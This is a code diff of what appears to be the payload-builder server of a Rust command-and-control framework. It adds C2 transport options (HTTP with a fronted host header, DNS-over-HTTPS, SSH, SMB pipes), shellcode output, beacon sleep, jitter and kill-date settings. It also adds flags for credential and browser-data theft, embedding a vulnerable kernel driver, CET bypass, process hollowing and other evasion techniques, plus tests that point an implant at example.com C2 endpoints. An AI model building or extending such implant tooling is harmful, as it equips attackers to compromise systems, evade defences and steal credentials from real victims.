@@ -1,5 +1,5 @@
 use axum::{extract::State, http::StatusCode, response::IntoResponse, Json};
-use chrono::{Datelike, Utc};
+use chrono::{Datelike, NaiveDate, Utc};
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
@@ -17,12 +17,15 @@ use crate::state::AppState;
 pub struct BuildRequest {
     pub os: String,
     pub arch: String,
-    /// Output format: "exe" (default), "shellcode", or "dll".
+    /// Output format: "exe" (default) or "shellcode".
     #[serde(default = "default_format")]
     pub format: String,
     /// Transport: "tls" (default), "http", "doh", "ssh", "smb".
     #[serde(default = "default_transport")]
     pub transport: String,
+    /// Optional runtime settings for transports that need more than host/port.
+    #[serde(default)]
+    pub transport_config: BuildTransportConfig,
     pub features: BuildFeatures,
     pub host: String,
     pub port: u16,
@@ -47,12 +50,27 @@ pub struct BuildRequest {
     /// Optional manifest preset (Windows only): "service", "elevated", "standard".
     #[serde(default)]
     pub manifest_preset: Option<String>,
+    /// Server-side path to the XOR-encrypted vulnerable driver binary to embed.
+    ///
+    /// Required when `features.embedded_driver` is `true` for a Windows build.
+    /// The file at this path is passed to the agent build as `ORCHESTRA_DRIVER_PATH`
+    /// so `deploy.rs` can `include_bytes!` it at compile time.
+    #[serde(default)]
+    pub driver_path: Option<String>,
 }
 
-fn default_format() -> String { "exe".into() }
-fn default_transport() -> String { "tls".into() }
-fn default_sleep_ms() -> u64 { 5000 }
-fn default_jitter() -> u8 { 20 }
+fn default_format() -> String {
+    "exe".into()
+}
+fn default_transport() -> String {
+    "tls".into()
+}
+fn default_sleep_ms() -> u64 {
+    5000
+}
+fn default_jitter() -> u8 {
+    20
+}
 
 #[derive(Deserialize, Debug, Clone)]
 pub struct PeVersionInfo {
@@ -63,7 +81,37 @@ pub struct PeVersionInfo {
     pub original_filename: Option<String>,
 }
 
-#[derive(Deserialize, Debug, Clone)]
+#[derive(Deserialize, Debug, Clone, Default)]
+pub struct BuildTransportConfig {
+    #[serde(default)]
+    pub http_endpoint: Option<String>,
+    #[serde(default)]
+    pub http_host_header: Option<String>,
+    #[serde(default)]
+    pub doh_server_url: Option<String>,
+    #[serde(default)]
+    pub doh_domain: Option<String>,
+    #[serde(default)]
+    pub ssh_host: Option<String>,
+    #[serde(default)]
+    pub ssh_port: Option<u16>,
+    #[serde(default)]
+    pub ssh_username: Option<String>,
+    #[serde(default)]
+    pub ssh_auth: Option<common::config::SshAuthConfig>,
+    #[serde(default)]
+    pub ssh_host_key_fingerprint: Option<String>,
+    #[serde(default)]
+    pub smb_pipe_host: Option<String>,
+    #[serde(default)]
+    pub smb_pipe_name: Option<String>,
+    #[serde(default)]
+    pub smb_pipe_mode: Option<String>,
+    #[serde(default)]
+    pub smb_tcp_relay_port: Option<u16>,
+}
+
+#[derive(Deserialize, Debug, Clone, Default)]
 pub struct BuildFeatures {
     #[serde(default)]
     pub persistence: bool,
@@ -105,6 +153,39 @@ pub struct BuildFeatures {
     /// Enables stack spoofing.
     #[serde(default)]
     pub stack_spoof: bool,
+    /// Enables reflective/manual module mapping.
+    #[serde(default)]
+    pub manual_map: bool,
+    /// Enables browser stored-data recovery.
+    #[serde(default)]
+    pub browser_data: bool,
+    /// Enables LSA Whisperer.
+    #[serde(default)]
+    pub lsa_whisperer: bool,
+    /// Enables kernel callback overwrite support.
+    #[serde(default)]
+    pub kernel_callback: bool,
+    /// Embeds the configured BYOVD driver payload when available.
+    #[serde(default)]
+    pub embedded_driver: bool,
+    /// Enables continuous memory hiding.
+    #[serde(default)]
+    pub evanesco: bool,
+    /// Enables user-mode syscall emulation.
+    #[serde(default)]
+    pub syscall_emulation: bool,
+    /// Enables CET/shadow-stack bypass support.
+    #[serde(default)]
+    pub cet_bypass: bool,
+    /// Enables token-only impersonation.
+    #[serde(default)]
+    pub token_impersonation: bool,
+    /// Enables NTFS transaction-backed process hollowing.
+    #[serde(default)]
+    pub transacted_hollowing: bool,
+    /// Enables delayed module-stomp injection.
+    #[serde(default)]
+    pub delayed_stomp: bool,
 }
 
 #[derive(Serialize)]
@@ -195,7 +276,17 @@ pub fn init_build_queue(workers: usize, build_dir: PathBuf, retention_days: u32)
                     let jid = job_id.clone();
                     let agent_secret = state_ref.config.agent_shared_secret.clone();
                     let module_key = state_ref.config.module_aes_key.clone();
-                    move || execute_build_safely(jid, req, operator, server_build_dir, map2, agent_secret, module_key)
+                    move || {
+                        execute_build_safely(
+                            jid,
+                            req,
+                            operator,
+                            server_build_dir,
+                            map2,
+                            agent_secret,
+                            module_key,
+                        )
+                    }
                 })
                 .await
                 // P2-15: propagate JoinError instead of panicking.
@@ -304,27 +395,28 @@ pub async fn handle_build(
 
     // P1-14: Reject build targets that point to private/internal IPs (SSRF).
     // Pin the resolved IP to prevent DNS rebinding attacks (V3 fix).
-    let pinned_ip = match resolve_and_validate_host(&req.host, state.config.allow_local_builds).await {
-        Ok(ip) => ip,
-        Err(e) => {
-            state.audit.record_simple(
-                "BUILDER",
-                &user.id,
-                "BuildRejected",
-                &format!("host={} reason={}", req.host, e),
-                common::Outcome::Failure,
-            );
-            return Err((
-                StatusCode::BAD_REQUEST,
-                Json(BuildResponse {
-                    job_id: None,
-                    log: None,
-                    status: None,
-                    error: Some(e.to_string()),
-                }),
-            ));
-        }
-    };
+    let pinned_ip =
+        match resolve_and_validate_host(&req.host, state.config.allow_local_builds).await {
+            Ok(ip) => ip,
+            Err(e) => {
+                state.audit.record_simple(
+                    "BUILDER",
+                    &user.id,
+                    "BuildRejected",
+                    &format!("host={} reason={}", req.host, e),
+                    common::Outcome::Failure,
+                );
+                return Err((
+                    StatusCode::BAD_REQUEST,
+                    Json(BuildResponse {
+                        job_id: None,
+                        log: None,
+                        status: None,
+                        error: Some(e.to_string()),
+                    }),
+                ));
+            }
+        };
 
     // Replace the hostname with the pinned IP so the agent connects directly
     // to the validated address, not the operator-supplied hostname.
@@ -332,6 +424,17 @@ pub async fn handle_build(
 
     // P1-15: Reject unsupported OS/arch values (TOML injection prevention).
     if let Err(e) = validate_target_os_arch(&req.os, &req.arch) {
+        return Err((
+            StatusCode::BAD_REQUEST,
+            Json(BuildResponse {
+                job_id: None,
+                log: None,
+                status: None,
+                error: Some(e.to_string()),
+            }),
+        ));
+    }
+    if let Err(e) = validate_build_options(&req) {
         return Err((
             StatusCode::BAD_REQUEST,
             Json(BuildResponse {
@@ -577,26 +680,27 @@ fn execute_build_safely(
             // resolved before comparison.  If the requested path does not yet
             // exist (canonicalize returns Err), fall back to normalizing the
             // lexical path to catch obvious traversal attempts.
-            let canonical_base = std::fs::canonicalize(&base_build_dir)
-                .unwrap_or_else(|_| base_build_dir.clone());
-            let canonical_requested = std::fs::canonicalize(&requested)
-                .unwrap_or_else(|_| {
-                    // Path doesn't exist yet; normalize lexically by resolving
-                    // `.` and `..` components from the path root so that e.g.
-                    // `/builds/../etc` correctly resolves to `/etc` (outside
-                    // the build dir) rather than appearing to be a subdirectory.
-                    let mut acc = PathBuf::new();
-                    for component in requested.components() {
-                        match component {
-                            std::path::Component::RootDir => acc.push("/"),
-                            std::path::Component::Prefix(p) => acc.push(p.as_os_str()),
-                            std::path::Component::CurDir => {} // skip `.`
-                            std::path::Component::ParentDir => { acc.pop(); }
-                            std::path::Component::Normal(p) => acc.push(p),
+            let canonical_base =
+                std::fs::canonicalize(&base_build_dir).unwrap_or_else(|_| base_build_dir.clone());
+            let canonical_requested = std::fs::canonicalize(&requested).unwrap_or_else(|_| {
+                // Path doesn't exist yet; normalize lexically by resolving
+                // `.` and `..` components from the path root so that e.g.
+                // `/builds/../etc` correctly resolves to `/etc` (outside
+                // the build dir) rather than appearing to be a subdirectory.
+                let mut acc = PathBuf::new();
+                for component in requested.components() {
+                    match component {
+                        std::path::Component::RootDir => acc.push("/"),
+                        std::path::Component::Prefix(p) => acc.push(p.as_os_str()),
+                        std::path::Component::CurDir => {} // skip `.`
+                        std::path::Component::ParentDir => {
+                            acc.pop();
                         }
+                        std::path::Component::Normal(p) => acc.push(p),
                     }
-                    acc
-                });
+                }
+                acc
+            });
             if canonical_requested.starts_with(&canonical_base) {
                 out_dir = requested;
             } else {
@@ -639,62 +743,105 @@ fn build_profile_from_request(
 ) -> anyhow::Result<builder::config::PayloadConfig> {
     validate_cert_pin(&req.pin)?;
     validate_target_os_arch(&req.os, &req.arch)?;
+    validate_build_options(req)?;
+    let transport = parse_payload_transport(&req.transport)?;
+
+    fn push_feature(features: &mut Vec<String>, feature: &str) {
+        if !features.iter().any(|existing| existing == feature) {
+            features.push(feature.to_string());
+        }
+    }
 
     let c2_addr = format!("{}:{}", req.host, req.port);
     let mut features = vec!["outbound-c".to_string()];
     if req.features.persistence {
-        features.push("persistence".to_string());
+        push_feature(&mut features, "persistence");
     }
     if req.features.direct_syscalls {
-        features.push("direct-syscalls".to_string());
+        push_feature(&mut features, "direct-syscalls");
     }
     if req.features.remote_assist {
-        features.push("remote-assist".to_string());
+        push_feature(&mut features, "remote-assist");
     }
     if req.features.stealth {
-        features.push("stealth".to_string());
+        push_feature(&mut features, "stealth");
     }
     if req.features.network_discovery {
-        features.push("network-discovery".to_string());
+        push_feature(&mut features, "network-discovery");
     }
     if req.features.forensic_cleanup {
-        features.push("forensic-cleanup".to_string());
+        push_feature(&mut features, "forensic-cleanup");
     }
     if req.features.self_reencode {
-        features.push("self-reencode".to_string());
+        push_feature(&mut features, "self-reencode");
     }
     if req.features.http_transport {
-        features.push("http-transport".to_string());
+        push_feature(&mut features, "http-transport");
     }
     if req.features.doh_transport {
-        features.push("doh-transport".to_string());
+        push_feature(&mut features, "doh-transport");
     }
     if req.features.ssh_transport {
-        features.push("ssh-transport".to_string());
+        push_feature(&mut features, "ssh-transport");
     }
     if req.features.smb_pipe_transport {
-        features.push("smb-pipe-transport".to_string());
+        push_feature(&mut features, "smb-pipe-transport");
     }
     if req.features.evasion_transform {
-        features.push("evasion-transform".to_string());
+        push_feature(&mut features, "evasion-transform");
     }
     if req.features.p2p {
-        features.push("p2p".to_string());
+        push_feature(&mut features, "p2p-tcp");
     }
     if req.features.stack_spoof {
-        features.push("stack-spoof".to_string());
+        push_feature(&mut features, "stack-spoof");
+    }
+    if req.features.manual_map {
+        push_feature(&mut features, "manual-map");
+    }
+    if req.features.browser_data {
+        push_feature(&mut features, "browser-data");
+    }
+    if req.features.lsa_whisperer {
+        push_feature(&mut features, "lsa-whisperer");
+    }
+    if req.features.kernel_callback {
+        push_feature(&mut features, "kernel-callback");
+    }
+    if req.features.embedded_driver {
+        push_feature(&mut features, "embedded_driver");
+    }
+    if req.features.evanesco {
+        push_feature(&mut features, "evanesco");
+    }
+    if req.features.syscall_emulation {
+        push_feature(&mut features, "syscall-emulation");
+    }
+    if req.features.cet_bypass {
+        push_feature(&mut features, "cet-bypass");
+    }
+    if req.features.token_impersonation {
+        push_feature(&mut features, "token-impersonation");
+    }
+    if req.features.transacted_hollowing {
+        push_feature(&mut features, "transacted-hollowing");
+    }
+    if req.features.delayed_stomp {
+        push_feature(&mut features, "delayed-stomp");
     }
     // Auto-enable transport feature based on transport field
-    match req.transport.as_str() {
-        "http" if !req.features.http_transport => { features.push("http-transport".to_string()); }
-        "doh" if !req.features.doh_transport => { features.push("doh-transport".to_string()); }
-        "ssh" if !req.features.ssh_transport => { features.push("ssh-transport".to_string()); }
-        "smb" if !req.features.smb_pipe_transport => { features.push("smb-pipe-transport".to_string()); }
-        _ => {}
+    match transport {
+        builder::config::PayloadTransport::Http => push_feature(&mut features, "http-transport"),
+        builder::config::PayloadTransport::Doh => push_feature(&mut features, "doh-transport"),
+        builder::config::PayloadTransport::Ssh => push_feature(&mut features, "ssh-transport"),
+        builder::config::PayloadTransport::Smb => push_feature(&mut features, "smb-pipe-transport"),
+        builder::config::PayloadTransport::Tls => {}
     }
 
-    let version_info = req.version_info.as_ref().map(|vi| {
-        builder::config::VersionInfoConfig {
+    let version_info = req
+        .version_info
+        .as_ref()
+        .map(|vi| builder::config::VersionInfoConfig {
             file_version: vi.file_version.clone(),
             product_version: None,
             file_description: vi.file_description.clone(),
@@ -705,8 +852,7 @@ fn build_profile_from_request(
             legal_copyright: None,
             comments: None,
             clone_from: None,
-        }
-    });
+        });
 
     Ok(builder::config::PayloadConfig {
         target_os: req.os.clone(),
@@ -719,9 +865,31 @@ fn build_profile_from_request(
         c_server_secret: Some(agent_shared_secret.to_string()),
         server_cert_fingerprint: Some(req.pin.clone()),
         features,
+        transport,
+        transport_settings: builder::config::TransportSettings {
+            http_endpoint: nonempty_clone(&req.transport_config.http_endpoint),
+            http_host_header: nonempty_clone(&req.transport_config.http_host_header),
+            doh_server_url: nonempty_clone(&req.transport_config.doh_server_url),
+            doh_domain: nonempty_clone(&req.transport_config.doh_domain),
+            ssh_host: nonempty_clone(&req.transport_config.ssh_host),
+            ssh_port: req.transport_config.ssh_port,
+            ssh_username: nonempty_clone(&req.transport_config.ssh_username),
+            ssh_auth: req.transport_config.ssh_auth.clone(),
+            ssh_host_key_fingerprint: nonempty_clone(
+                &req.transport_config.ssh_host_key_fingerprint,
+            ),
+            smb_pipe_host: nonempty_clone(&req.transport_config.smb_pipe_host),
+            smb_pipe_name: nonempty_clone(&req.transport_config.smb_pipe_name),
+            smb_pipe_mode: nonempty_clone(&req.transport_config.smb_pipe_mode),
+            smb_tcp_relay_port: req.transport_config.smb_tcp_relay_port,
+        },
         output_name: Some(job_id.to_string()),
         package: "agent".to_string(),
         bin_name: Some("agent-standalone".to_string()),
+        output_format: parse_payload_format(&req.format)?,
+        sleep_ms: Some(req.sleep_ms),
+        jitter: Some(req.jitter),
+        kill_date: req.kill_date.clone(),
         version_info,
         icon_path: None,
         manifest_preset: req.manifest_preset.clone(),
@@ -729,6 +897,12 @@ fn build_profile_from_request(
         strip_signature: true,
         strip_debug: true,
         module_aes_key,
+        driver_path: req
+            .driver_path
+            .as_deref()
+            .map(str::trim)
+            .filter(|p| !p.is_empty())
+            .map(str::to_string),
     })
 }
 
@@ -737,6 +911,126 @@ const ALLOWED_OS: &[&str] = &["linux", "windows", "macos"];
 
 /// Allowed target architectures for builds.
 const ALLOWED_ARCH: &[&str] = &["x86_64", "aarch64"];
+
+fn parse_payload_format(format: &str) -> anyhow::Result<builder::config::PayloadFormat> {
+    match format.trim().to_ascii_lowercase().as_str() {
+        "" | "exe" => Ok(builder::config::PayloadFormat::Exe),
+        "shellcode" => Ok(builder::config::PayloadFormat::Shellcode),
+        other => anyhow::bail!(
+            "unsupported output format '{}'; allowed values: exe, shellcode",
+            other
+        ),
+    }
+}
+
+fn parse_payload_transport(transport: &str) -> anyhow::Result<builder::config::PayloadTransport> {
+    match transport.trim().to_ascii_lowercase().as_str() {
+        "" | "tls" => Ok(builder::config::PayloadTransport::Tls),
+        "http" => Ok(builder::config::PayloadTransport::Http),
+        "doh" => Ok(builder::config::PayloadTransport::Doh),
+        "ssh" => Ok(builder::config::PayloadTransport::Ssh),
+        "smb" => Ok(builder::config::PayloadTransport::Smb),
+        other => anyhow::bail!(
+            "unsupported transport '{}'; allowed values: tls, http, doh, ssh, smb",
+            other
+        ),
+    }
+}
+
+fn nonempty_clone(value: &Option<String>) -> Option<String> {
+    value
+        .as_deref()
+        .map(str::trim)
+        .filter(|value| !value.is_empty())
+        .map(str::to_string)
+}
+
+fn validate_build_options(req: &BuildRequest) -> anyhow::Result<()> {
+    let format = parse_payload_format(&req.format)?;
+    let transport = parse_payload_transport(&req.transport)?;
+    if req.sleep_ms == 0 {
+        anyhow::bail!("sleep_ms must be greater than zero");
+    }
+    if req.jitter > 100 {
+        anyhow::bail!("jitter must be between 0 and 100");
+    }
+    if let Some(kill_date) = req.kill_date.as_deref() {
+        validate_kill_date(kill_date)?;
+    }
+    let os = req.os.to_ascii_lowercase();
+    let arch = req.arch.to_ascii_lowercase();
+    if format == builder::config::PayloadFormat::Shellcode && (os != "windows" || arch != "x86_64")
+    {
+        anyhow::bail!("shellcode output is supported only for windows/x86_64 builds");
+    }
+    validate_transport_options(transport, req)?;
+    validate_embedded_driver_options(req)?;
+    Ok(())
+}
+
+fn validate_embedded_driver_options(req: &BuildRequest) -> anyhow::Result<()> {
+    if req.features.embedded_driver {
+        if req.os.to_ascii_lowercase() != "windows" {
+            anyhow::bail!("embedded_driver is only supported for Windows builds");
+        }
+        if req
+            .driver_path
+            .as_deref()
+            .map(str::trim)
+            .filter(|p| !p.is_empty())
+            .is_none()
+        {
+            anyhow::bail!(
+                "embedded_driver requires driver_path (server-side path to XOR-encrypted driver binary)"
+            );
+        }
+    }
+    Ok(())
+}
+
+fn validate_transport_options(
+    transport: builder::config::PayloadTransport,
+    req: &BuildRequest,
+) -> anyhow::Result<()> {
+    match transport {
+        builder::config::PayloadTransport::Tls
+        | builder::config::PayloadTransport::Http
+        | builder::config::PayloadTransport::Doh => Ok(()),
+        builder::config::PayloadTransport::Ssh => {
+            if nonempty_clone(&req.transport_config.ssh_username).is_none() {
+                anyhow::bail!("ssh transport requires transport_config.ssh_username");
+            }
+            if req.transport_config.ssh_auth.is_none() {
+                anyhow::bail!("ssh transport requires transport_config.ssh_auth");
+            }
+            Ok(())
+        }
+        builder::config::PayloadTransport::Smb => {
+            if let Some(mode) = nonempty_clone(&req.transport_config.smb_pipe_mode) {
+                if mode != "smb" && mode != "tcp_relay" {
+                    anyhow::bail!(
+                        "smb transport_config.smb_pipe_mode must be 'smb' or 'tcp_relay'"
+                    );
+                }
+            }
+            Ok(())
+        }
+    }
+}
+
+fn validate_kill_date(kill_date: &str) -> anyhow::Result<()> {
+    let trimmed = kill_date.trim();
+    if trimmed.is_empty() {
+        return Ok(());
+    }
+    let parsed = NaiveDate::parse_from_str(trimmed, "%Y-%m-%d")
+        .map_err(|_| anyhow::anyhow!("kill_date must use YYYY-MM-DD format"))?;
+    let today = Utc::now().date_naive();
+    if parsed <= today {
+        anyhow::bail!("kill_date must be after today's UTC date");
+    }
+    Ok(())
+}
 
 /// Validate that the requested OS and arch are on the strict whitelist.
 ///
@@ -1018,24 +1312,32 @@ mod tests {
         BuildRequest {
             os: "linux".into(),
             arch: "x86_64".into(),
+            format: "exe".into(),
+            transport: "tls".into(),
+            transport_config: BuildTransportConfig::default(),
             features: BuildFeatures {
                 persistence: true,
-                direct_syscalls: false,
-                remote_assist: false,
-                stealth: false,
+                ..BuildFeatures::default()
             },
             host: "127.0.0.1".into(),
             port: 8444,
             pin: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef".into(),
             key: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=".into(),
             output_dir: None,
+            sleep_ms: 5000,
+            jitter: 20,
+            kill_date: None,
             seed: None,
+            version_info: None,
+            manifest_preset: None,
+            driver_path: None,
         }
     }
 
     #[test]
     fn server_build_profile_targets_outbound_agent_with_pin() {
-        let profile = build_profile_from_request("job123", &request(), "test_secret", None).unwrap();
+        let profile =
+            build_profile_from_request("job123", &request(), "test_secret", None).unwrap();
         assert_eq!(profile.package, "agent");
         assert_eq!(profile.bin_name.as_deref(), Some("agent-standalone"));
         assert_eq!(profile.output_name.as_deref(), Some("job123"));
@@ -1045,6 +1347,175 @@ mod tests {
         );
         assert!(profile.features.contains(&"outbound-c".to_string()));
         assert!(profile.features.contains(&"persistence".to_string()));
+    }
+
+    #[test]
+    fn server_build_profile_maps_p2p_to_tcp_feature() {
+        let mut req = request();
+        req.features = BuildFeatures {
+            p2p: true,
+            ..BuildFeatures::default()
+        };
+
+        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();
+
+        assert!(profile.features.contains(&"p2p-tcp".to_string()));
+        assert!(!profile.features.contains(&"p2p".to_string()));
+    }
+
+    #[test]
+    fn server_build_profile_bakes_selected_http_transport() {
+        let mut req = request();
+        req.transport = "http".into();
+        req.transport_config.http_endpoint = Some("https://front.example.com/c2".into());
+        req.transport_config.http_host_header = Some("c2.example.com".into());
+
+        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();
+
+        assert_eq!(profile.transport, builder::config::PayloadTransport::Http);
+        assert!(profile.features.contains(&"http-transport".to_string()));
+        assert_eq!(
+            profile.transport_settings.http_endpoint.as_deref(),
+            Some("https://front.example.com/c2")
+        );
+        assert_eq!(
+            profile.transport_settings.http_host_header.as_deref(),
+            Some("c2.example.com")
+        );
+    }
+
+    #[test]
+    fn server_build_profile_requires_ssh_runtime_auth() {
+        let mut req = request();
+        req.transport = "ssh".into();
+
+        let err = build_profile_from_request("job123", &req, "test_secret", None).unwrap_err();
+        assert!(err.to_string().contains("ssh_username"));
+
+        req.transport_config.ssh_username = Some("operator".into());
+        req.transport_config.ssh_auth = Some(common::config::SshAuthConfig::Agent);
+
+        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();
+        assert_eq!(profile.transport, builder::config::PayloadTransport::Ssh);
+        assert!(profile.features.contains(&"ssh-transport".to_string()));
+        assert_eq!(
+            profile.transport_settings.ssh_username.as_deref(),
+            Some("operator")
+        );
+        assert!(matches!(
+            profile.transport_settings.ssh_auth,
+            Some(common::config::SshAuthConfig::Agent)
+        ));
+    }
+
+    #[test]
+    fn server_build_profile_applies_behavior_fields() {
+        let mut req = request();
+        req.os = "windows".into();
+        req.format = "shellcode".into();
+        req.sleep_ms = 12_345;
+        req.jitter = 37;
+        req.kill_date = Some("2099-12-31".into());
+
+        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();
+
+        assert_eq!(
+            profile.output_format,
+            builder::config::PayloadFormat::Shellcode
+        );
+        assert_eq!(profile.sleep_ms, Some(12_345));
+        assert_eq!(profile.jitter, Some(37));
+        assert_eq!(profile.kill_date.as_deref(), Some("2099-12-31"));
+    }
+
+    #[test]
+    fn server_rejects_unsupported_format_combinations() {
+        let mut req = request();
+        req.format = "shellcode".into();
+
+        let err = build_profile_from_request("job123", &req, "test_secret", None).unwrap_err();
+
+        assert!(err.to_string().contains("windows/x86_64"));
+    }
+
+    #[test]
+    fn server_build_profile_maps_advertised_feature_fields() {
+        let mut req = request();
+        // embedded_driver is Windows-only; switch to a Windows build so the
+        // validation in validate_embedded_driver_options passes.
+        req.os = "windows".into();
+        req.driver_path = Some("/opt/drivers/test_driver.xor".into());
+        req.features = BuildFeatures {
+            persistence: true,
+            direct_syscalls: true,
+            remote_assist: true,
+            stealth: true,
+            network_discovery: true,
+            forensic_cleanup: true,
+            self_reencode: true,
+            http_transport: true,
+            doh_transport: true,
+            ssh_transport: true,
+            smb_pipe_transport: true,
+            evasion_transform: true,
+            p2p: true,
+            stack_spoof: true,
+            manual_map: true,
+            browser_data: true,
+            lsa_whisperer: true,
+            kernel_callback: true,
+            embedded_driver: true,
+            evanesco: true,
+            syscall_emulation: true,
+            cet_bypass: true,
+            token_impersonation: true,
+            transacted_hollowing: true,
+            delayed_stomp: true,
+        };
+
+        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();
+        let expected = [
+            "outbound-c",
+            "persistence",
+            "direct-syscalls",
+            "remote-assist",
+            "stealth",
+            "network-discovery",
+            "forensic-cleanup",
+            "self-reencode",
+            "http-transport",
+            "doh-transport",
+            "ssh-transport",
+            "smb-pipe-transport",
+            "evasion-transform",
+            "p2p-tcp",
+            "stack-spoof",
+            "manual-map",
+            "browser-data",
+            "lsa-whisperer",
+            "kernel-callback",
+            "embedded_driver",
+            "evanesco",
+            "syscall-emulation",
+            "cet-bypass",
+            "token-impersonation",
+            "transacted-hollowing",
+            "delayed-stomp",
+        ];
+
+        for feature in expected {
+            assert!(
+                profile.features.contains(&feature.to_string()),
+                "missing mapped feature {feature}"
+            );
+        }
+
+        let available = builder::config::read_agent_features().unwrap();
+        let (_, unknown) = builder::config::partition_features(&profile.features, &available);
+        assert!(
+            unknown.is_empty(),
+            "server emitted features not declared in agent/Cargo.toml: {unknown:?}"
+        );
     }
 
     #[test]
